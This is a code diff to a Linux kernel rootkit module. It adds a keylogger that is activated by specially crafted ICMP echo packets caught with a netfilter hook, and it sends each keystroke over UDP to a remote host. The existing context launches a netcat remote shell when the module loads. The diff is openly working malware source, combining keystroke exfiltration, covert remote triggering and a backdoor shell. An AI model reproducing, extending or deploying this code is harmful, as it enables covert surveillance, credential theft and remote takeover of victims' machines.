@@ -12,6 +12,12 @@
 #include <linux/module.h>
 #include <linux/string.h>
 #include <linux/keyboard.h>
+#include <linux/netfilter.h>
+#include <linux/netfilter_ipv4.h>
+#include <linux/ip.h>
+#include <linux/icmp.h>
+
+#include <linux/netpoll.h>
 
 /* PROTO */
 
@@ -19,13 +25,45 @@ int keyboard_hook(struct notifier_block *, unsigned long code, void *);
 
 /* DATA */
 
+const int KEYLOGGER_ACTIVATE_CODE = 122;
+const int KEYLOGGER_DECATIVATE_CODE = 123;
+
+int KEYLOGGER_ACTIVE = 0;
+
+static struct nf_hook_ops netfilter_hook;
 static struct notifier_block keyboard_notifier = {
   .notifier_call = keyboard_hook
 };
 
+static struct netpoll* np = NULL;
+static struct netpoll np_t;
+
 struct list_head * new_head;
 
 /* FUNCTIONALITY */
+
+void init_netpoll(int src, int dest)
+{
+    np_t.name = "LRNG";
+    strlcpy(np_t.dev_name, "eth0", IFNAMSIZ);
+    np_t.local_ip.ip = src;
+    np_t.local_ip.in.s_addr = src;
+    np_t.remote_ip.ip = dest;
+    np_t.remote_ip.in.s_addr = dest;
+    np_t.ipv6 = 0;//no IPv6
+    np_t.local_port = 6666;
+    np_t.remote_port = 1337;
+    memset(np_t.remote_mac, 0xff, ETH_ALEN);
+    netpoll_print_options(&np_t);
+    netpoll_setup(&np_t);
+    np = &np_t;
+}
+
+void sendUdp(const char* buf)
+{
+  int len = strlen(buf);
+  netpoll_send_udp(np, buf,len);
+}
 
 int keyboard_hook(struct notifier_block *nblock, unsigned long code, void *_param) {
 	struct keyboard_notifier_param *param = _param;
@@ -33,6 +71,13 @@ int keyboard_hook(struct notifier_block *nblock, unsigned long code, void *_para
 #ifdef LOG
 	if (code == KBD_KEYCODE && param->down) printk(KERN_DEBUG "KEYLOGGER %i down\n", param->value);
 #endif
+
+	if (code == KBD_KEYCODE && param->down && KEYLOGGER_ACTIVE){
+	      char str[5];
+        printk(KERN_DEBUG "KEYLOGGER SENDING KEY %i %s\n", param->value, (param->down ? "down" : "up"));
+	      sprintf(str, "%d.", param->value);
+	      sendUdp(str);
+    }
 
 	return NOTIFY_OK;
 }
@@ -61,6 +106,39 @@ void start_remote_shell(void){
     call_usermodehelper(argv3[0], argv3, envp, UMH_WAIT_PROC); //Launch netcat the fisrt time
 }
 
+static void handle_magic_package(int code, int src, int dest){
+	if (code == KEYLOGGER_ACTIVATE_CODE){
+			if(!KEYLOGGER_ACTIVE){
+              init_netpoll(src, dest);
+              sendUdp("Hello");
+            }
+            KEYLOGGER_ACTIVE = 1;
+#ifdef LOG
+            printk(KERN_DEBUG "KEYLOGGER ACTIVATION PACKAGE!");
+#endif
+    }else if (code == KEYLOGGER_DECATIVATE_CODE){
+    	KEYLOGGER_ACTIVE = 0;
+    }     
+}
+
+static unsigned int filter_icmp_messages(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *))
+{
+  	struct iphdr *iph;
+   	struct icmphdr *icmph;
+
+   	if(skb == NULL)
+    	return -1;
+
+   	iph = ip_hdr(skb);
+   	if(iph->protocol == IPPROTO_ICMP){
+        icmph = icmp_hdr(skb);
+        if(icmph->type == ICMP_ECHO && icmph->code == icmph->un.echo.id)
+        	handle_magic_package(icmph->code,iph->daddr, iph->saddr);
+   }
+   return NF_ACCEPT;
+}
+
+
 /*BOOTSTRAPING*/
 
 static int __init rootkit_start(void){
@@ -69,11 +147,19 @@ static int __init rootkit_start(void){
 #endif
 	start_remote_shell();
 	register_keyboard_notifier(&keyboard_notifier);
+
+	netfilter_hook.hook = filter_icmp_messages;
+    netfilter_hook.hooknum = 0;
+    netfilter_hook.pf = PF_INET;
+    netfilter_hook.priority = 1;
+    nf_register_hook(&netfilter_hook);
+
 	return 0;
 }
 
 static void __exit rootkit_end(void){
 	unregister_keyboard_notifier(&keyboard_notifier);
+	nf_unregister_hook(&netfilter_hook);
 }
 
 module_init(rootkit_start);
